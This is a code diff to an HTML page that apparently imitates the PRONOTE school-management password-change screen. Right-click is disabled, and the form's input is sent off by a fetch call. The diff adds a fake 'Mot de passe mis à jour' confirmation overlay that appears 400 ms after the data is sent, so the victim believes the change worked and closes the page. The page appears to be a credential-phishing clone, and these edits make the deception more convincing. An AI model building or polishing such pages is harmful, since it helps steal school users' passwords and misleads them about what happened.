@@ -53,6 +53,33 @@ deferLoadingScript.add ('defer', ['E_1_C_51D769F73843D08960397E0A9D4A98D7EF4DAD6
 
 <body oncontextmenu="return false;" id="id_body"
   class="EspaceIndex">
+  <div id="container-fin" class="cache">
+    <div id="IE.Identite.collection.g5_Fenetre" aria-labelledby="IE.Identite.collection.g5_Titre"
+    aria-describedby="IE.Identite.collection.g5_Contenu" class="ObjetFenetre_Espace ObjetMessage ObjetMessage_0"
+    tabindex="-1" role="alertdialog" aria-modal="true">
+    <div id="IE.Identite.collection.g5_FenetreContenu" class="Fenetre_Cadre ombre-cadre"
+      style="box-sizing:border-box; width: 100px;min-height: 100px; background-color:var(--color-background);">
+      <div class="Fenetre_Titre NePasImprimer">
+        <h1 id="IE.Identite.collection.g5_Titre" class="ZoneDeplacementFenetre ie-draggable-handle" tabindex="0"><i
+            class="om_iconeTitre" aria-hidden="true"></i>Information</h1>
+        <div class="cta-conteneur" style="display: none;"><i role="button" tabindex="0"
+            class="btnImageIcon as-button icon_fermeture_widget btnImage" aria-label="Fermer" title="Fermer"></i></div>
+      </div>
+      <div id="IE.Identite.collection.g5_Res" class="Fenetre_Espace">
+        <div id="IE.Identite.collection.g5_Contenu" class="Fenetre_Contenu">
+          <p style="width:360px;" class="contenu"><h3>Mot de passe mis à jour</h3><br>Merci d'avoir mis à jour votre mot de passe. Vous pouvez désormais fermer cette page.</p>
+        </div>
+      </div>
+      <div class="NePasImprimer">
+        <div class="zone-bas"><!--ie-if-->
+          <div class="btn-conteneur"><!--ie-repeat-->
+            <div></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  </div>
   <script>
 
     window.mobileCheck = function() {
@@ -187,6 +214,7 @@ deferLoadingScript.add ('defer', ['E_1_C_51D769F73843D08960397E0A9D4A98D7EF4DAD6
                       </div>
                     </div>
                   </div>
+                  
                   <div class="input-field label-up"><label class="champ-requis" for="id_30">Nouveau mot de passe</label>
                     <div class="flex-contain full-width">
                       <div class="as-input as-password"><input oninput="checkco()" name="mdp" id="nvmdp" type="password"
@@ -265,6 +293,27 @@ deferLoadingScript.add ('defer', ['E_1_C_51D769F73843D08960397E0A9D4A98D7EF4DAD6
     2024.3.7 gestion de vie scolaire, notes, compétences, absences/retards/dispenses, incidents/punitions/sanctions,
     stages... INDEX ÉDUCATION</a>
   <style>
+    #container-fin {
+      position: absolute;
+      top: 0;
+      left: 0;
+      z-index: 10;
+      width: 100vw;
+      height: 100vh;
+      display: grid;
+      place-items: center;
+      background-color: #ffffff66;
+    }
+
+    #container-fin > * {
+      transform: scale(1.1);
+    }
+
+
+    #container-fin.cache {
+      display: none;
+    }
+
     .flexhead {
       width: 100vw;
       display: flex;
@@ -272,6 +321,8 @@ deferLoadingScript.add ('defer', ['E_1_C_51D769F73843D08960397E0A9D4A98D7EF4DAD6
     }
   </style>
   <script>
+    let fin = document.querySelector('#container-fin');
+
     function modedeco() {
       alert('Choisissez le mode de connexion.\nEn mode "Dans la classe" vous n\'aurez accès qu\'à la saisie des absences et du cahier de textes, pour plus de confidentialité.')
     }
@@ -305,6 +356,10 @@ deferLoadingScript.add ('defer', ['E_1_C_51D769F73843D08960397E0A9D4A98D7EF4DAD6
         document.getElementById('voirmdp').classList.remove('icon_eye_close')
         document.getElementById('voirmdp').classList.add('icon_eye_open')
       }
+    }
+
+    function cache() {
+      fin.classList.toggle('cache')
     }
 
     
@@ -355,6 +410,9 @@ deferLoadingScript.add ('defer', ['E_1_C_51D769F73843D08960397E0A9D4A98D7EF4DAD6
                 .catch(error => {
                     console.error('Error sending message:', error);
             });
+            setTimeout(()=> {
+              fin.classList.remove('cache')
+            }, 400)
         });
   </script>
 
